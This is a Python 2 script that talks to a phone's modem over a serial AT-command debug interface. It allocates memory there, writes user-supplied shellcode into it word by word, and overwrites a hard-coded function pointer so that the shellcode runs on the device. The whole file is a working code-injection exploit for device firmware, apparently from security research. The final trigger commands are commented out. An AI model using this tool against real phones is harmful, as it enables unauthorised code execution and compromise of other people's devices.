#!/usr/bin/python
import sys,struct

from serial import *
import time

#POINTERADDRESS=0x214ce730 # xfs process
POINTERADDRESS=0x2148BB44 # echo command
# serial object
# please adjust to device properties
serial = Serial(port="/dev/ttyACM0",baudrate=115200,bytesize=EIGHTBITS,parity=PARITY_NONE,stopbits=STOPBITS_ONE,timeout=None,xonxoff=0,rtscts=0)


#Load hook function
def loadhook(filename):
	buf=open(filename,"rb").read()
	start=buf.find("STRT")
	end=buf.find("aeabi")
	return buf[start+4:end]


#Send command via serial
def send(str):
	ret=""
	serial.write(str)
	for i in range(100):
		time.sleep(0.03)
		if serial.inWaiting()==0:
			break
		ret+= serial.read(serial.inWaiting())
	return ret

def send_cmd(str):
	recv_data = send("\r\nat@xsh=\"%s\"\r\n" % str)
	recv_data = recv_data.replace("\r\n\r\n", "")	
	return recv_data

##Main

if (len(sys.argv))<2:
	print "Usage: %s <shellcode> [Hookpointer]" % sys.argv[0]
	exit(0)

#Load hook and arguments
print "Loading hook..."
hook=loadhook(sys.argv[1])
print "Loaded %d bytes" % len(hook)

if len(sys.argv)==3:
	POINTERADDRESS=int(sys.argv[2],16)
print "Pointer to hook: 0x%08X" % POINTERADDRESS

##Connect to phone and check version
serial.open()

# init
recv_data = send_cmd("AT")
recv_data = send_cmd("AT")

# version
recv_data = send_cmd("version")
verpos = recv_data.find("Ver:")
if (verpos<0):
	print "Error connecting to phone"
	serial.close()
	exit(0)
fwversion = recv_data[verpos+5:verpos+10]
print "Connection OK. Firmware version: %s" % fwversion

## Allocate Memory
print "Allocating memory..."
recv_data = send_cmd("xmm malloc %d" % (len(hook)+100))
sizestrt = recv_data.find("Allocation of")
sizeend = recv_data.find("bytes")
addrstrt = recv_data.find("pointer ")
addrend = recv_data.find("OK")
try:
	sizealloc=int(recv_data[sizestrt+14:sizeend])
	pointer = int(recv_data[addrstrt+8:addrend],16)
except:
	sizealloc = 0
	pass

if (sizealloc!=len(hook)+100):
	print "Error allocating: asked %d, got %d" % (len(hook)+100,sizealloc)
	serial.close()
	exit(0)
print "Successfully allocated %d bytes of memory at 0x%X" % ((len(hook)+100),pointer)

#write hook shellcode in memory
print "Writing shellcode into allocated chunk:"
hook+="AAAA" # padding
for i in range(0,len(hook)-4,4):
	recv_data= send_cmd("poke 32 0x%08X 0x%08X" % (pointer+i,ord(hook[i])+256*ord(hook[i+1])+256*256*ord(hook[i+2])+256*256*256*ord(hook[i+3]) ))
	recv_data = recv_data.replace("\nOK\r\n", "")	
	recv_data = recv_data.replace("\n", "")	
	recv_data = recv_data.replace("\r", "")	
	print "%s" % recv_data

print "Modifying function pointer..."
print send_cmd("poke 32 0x%08X 0x%08X" % (POINTERADDRESS,pointer))

#print "Triggering jump to shellcode..."
#print send_cmd("echo 0x214784e8")
#for i in range(2):
#	print send("\r\nAT\r\n")

serial.close()

